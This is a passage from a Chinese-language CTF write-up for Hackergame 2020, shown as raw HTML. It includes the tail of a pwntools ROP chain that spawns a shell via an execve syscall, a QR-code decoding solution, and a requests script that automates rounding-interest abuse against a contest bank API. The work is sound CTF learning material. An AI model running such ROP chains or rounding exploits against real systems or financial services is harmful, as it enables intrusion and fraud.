class="token comment" spellcheck="true"># pop rax ; ret</span>p <span class="token operator">+=</span> b<span class="token string">'/bin//sh'</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000046d7b1</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># mov qword ptr [rsi], rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000407228</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004a60e8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000439070</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># xor rax, rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000046d7b1</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># mov qword ptr [rsi], rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004017b6</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># pop rdi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004a60e0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000407228</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004a60e8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000043dbb5</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># pop rdx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004a60e8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000439070</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># xor rax, rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000402bf4</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># syscall</span>payload <span class="token operator">+=</span> psh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'such as (0,1): '</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107011551816.png" alt="flag2"></p><hr><h2 id="来自未来的信笺"><a href="#来自未来的信笺" class="headerlink" title="来自未来的信笺"></a>来自未来的信笺</h2><p><em>（复现）</em></p><blockquote><p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p><p>“Send from Arctic.” 正文就只有这一句话。</p><p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p><p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p></blockquote><p>这题做的时候已经想到是 <a href="https://archiveprogram.github.com/" target="_blank" rel="noopener">GitHub Archive Program</a> 了，但没想到真就整了一题。</p><p>一堆二维码。第一张出来是个 <code>META</code>.</p><p>前几张二维码里有一张内容是 GitHub 的 API 列表。对应的仓库是 openlug/nonexist。</p><p>然后我真去找了，发现没有，一种可能是 Private Repo，可能之前有过 Public？</p><p>于是去找了一些公开的 GitHub Archive 网站，并没有找到。</p><p>另一种可能就是假的了，真不存在。</p><p>不管了先把所有的二维码给解码出来，合并到一个文件里。</p><p>比赛做题的时候用的 Python 的 <code>pyzbar</code> 库，还特地注意了用 <code>rb</code> 以二进制来写入文件，然而出来的文件啥也不是……啥文件头都找不到，就离谱。</p><p>比赛结束了才知道是这个解析库本身存在问题，在 <code>\x00</code> 处会截断。</p><p>参考官方 WP 以及 总榜 rk1 大师傅的 WP，可以用 <a href="https://github.com/mchehab/zbar/tree/master" target="_blank" rel="noopener">zbarimg</a> 这个命令行工具来解码。</p><p><del>（脏话一堆，别问，问就是装 zbarimg 心态炸了</del></p><p>这里就用 Python 调用命令行来执行好了。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> osfile_list <span class="token operator">=</span> list<span class="token punctuation">(</span>os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span><span class="token string">'./frames'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">for</span> f <span class="token keyword">in</span> file_list<span class="token punctuation">:</span>    fi <span class="token operator">=</span> <span class="token string">'./frames/'</span> <span class="token operator">+</span> f    cmd <span class="token operator">=</span> <span class="token string">'zbarimg --raw -Sbinary %s >> frames.tar'</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>cmd <span class="token operator">%</span> fi<span class="token punctuation">)</span></code></pre><p>然后这个出来的 <code>frames.tar</code> 是个压缩包，解压再解压就能拿到 flag 了。</p><blockquote><p>BTW, 比赛结束才知道那个 META 其实并不是个 Private Repo，而是 openlug/django-common，就去年 hackergame 的一道题。。</p></blockquote><hr><h2 id="狗狗银行"><a href="#狗狗银行" class="headerlink" title="狗狗银行"></a>狗狗银行</h2><p>这题也有点意思。</p><p><strong>四舍五入薅羊毛大法</strong>好啊。（当然这也是一种可行方案啦）</p><p><strong>储蓄卡 利率每日 0.3%</strong></p><p>因此 五入 最少需要 0.5/0.003=167。</p><p><strong>信用卡 利率每日 0.5%，最低 10</strong></p><p>最划算的话是 10/0.005=2000，且欠款在 2000 到 2100 之间每日利息都是10。</p><p>把欠款控制在这个范围内就能薅羊毛了。</p><p>2000/167 =&gt; 12 借款分到12张储蓄卡中。</p><p>首先开6张信用卡，开12*6张储蓄卡，且依次转账到储蓄卡，每张卡167，确保每天有1的利息。</p><p>首先用初始的储蓄卡1000元吃饭，等储蓄卡余额 &gt;= 177 的时候就能用储蓄卡还款+吃饭了。</p><p>最开始点的手累死了，想想算了写脚本吧。</p><p>首先把各个方法封装好。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""Hackergame 2020狗狗银行@Author: MiaoTony@Time: 20201102"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> jsonurl_prefix <span class="token operator">=</span> r<span class="token string">'http://202.38.93.111:10100/api/'</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"202.38.93.111:10100"</span><span class="token punctuation">,</span>    <span class="token string">"Origin"</span><span class="token punctuation">:</span> <span class="token string">"http://202.38.93.111:10100"</span><span class="token punctuation">,</span>    <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">"http://202.38.93.111:10100/"</span><span class="token punctuation">,</span>    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json;charset=utf-8"</span><span class="token punctuation">,</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"</span><span class="token punctuation">,</span>    <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span><span class="token punctuation">,</span>    <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span>    <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"keep-alive"</span><span class="token punctuation">,</span>    <span class="token string">"Cache-Control"</span><span class="token punctuation">:</span> <span class="token string">"max-age=0"</span><span class="token punctuation">,</span>    <span class="token string">"Authorization"</span><span class="token punctuation">:</span> <span class="token string">"Bearer &lt;your_token>"</span><span class="token punctuation">,</span>    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string">"session=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"</span><span class="token punctuation">,</span><span class="token punctuation">}</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>headers <span class="token operator">=</span> headers<span class="token keyword">def</span> <span class="token function">create_card</span><span class="token punctuation">(</span>kind<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    办卡     :param kind: {str} `credit`信用卡，`debit`储蓄卡    """</span>    url <span class="token operator">=</span> url_prefix <span class="token operator">+</span> <span class="token string">'create'</span>    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span> kind<span class="token punctuation">}</span>    r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>payload<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">return</span> r<span class="token punctuation">.</span>text<span class="token keyword">def</span> <span class="token function">get_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    获取用户信息    """</span>    url <span class="token operator">=</span> url_prefix <span class="token operator">+</span> <span class="token string">'user'</span>    r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    <span class="token comment" spellcheck="true"># print(r.json())</span>    <span class="token keyword">return</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_balance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    获取净资产    """</span>    info <span class="token operator">=</span> get_info<span class="token punctuation">(</span><span class="token punctuation">)</span>    accounts <span class="token operator">=</span> info<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'accounts'</span><span class="token punctuation">)</span>    balance <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> account <span class="token keyword">in</span> accounts<span class="token punctuation">:</span>        <span class="token keyword">if</span> account<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'type'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'debit'</span><span class="token punctuation">:</span>            balance <span class="token operator">+=</span> account<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'balance'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> account<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'type'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'credit'</span><span class="token punctuation">:</span>            balance <span class="token operator">-=</span> account<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'balance'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> balance<span class="token keyword">def</span> <span class="token function">get_debt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    获取欠款    """</span>    info <span class="token operator">=</span> get_info<span class="token punctuation">(</span><span class="token punctuation">)</span>    accounts <span class="token operator">=</span> info<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'accounts'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> account <span class="token keyword">in</span> accounts<span class="token punctuation">:</span>        <span class="token keyword">if</span> account<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'type'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'credit'</span><span class="token punctuation">:</span>            debt <span class="token operator">=</span> account<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'balance'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> debt<span class="token keyword">def</span> <span class="token function">transfer</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    转账    """</span>    url <span class="token operator">=</span> url_prefix <span class="token operator">+</span> <span class="token string">'transfer'</span>    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"src"</span><span class="token punctuation">:</span> src<span class="token punctuation">,</span> <span class="token string">"dst"</span><span class="token punctuation">:</span> dst<span class="token punctuation">,</span> <span class="token string">"amount"</span><span class="token punctuation">:</span> amount<span class="token punctuation">}</span>    r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>payload<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">return</span> r<span class="token punctuation">.</span>text<span class="token keyword">def</span> <span class="token function">eat</span><span class="token punctuation">(</span>account<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    吃饭    """</span>    url <span class="token operator">=</span> url_prefix <span class="token operator">+</span> <span class="token string">'eat'</span>    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"account"</span><span class="token punctuation">:</span> account<span class="token punctuation">}</span>    r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>payload<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span 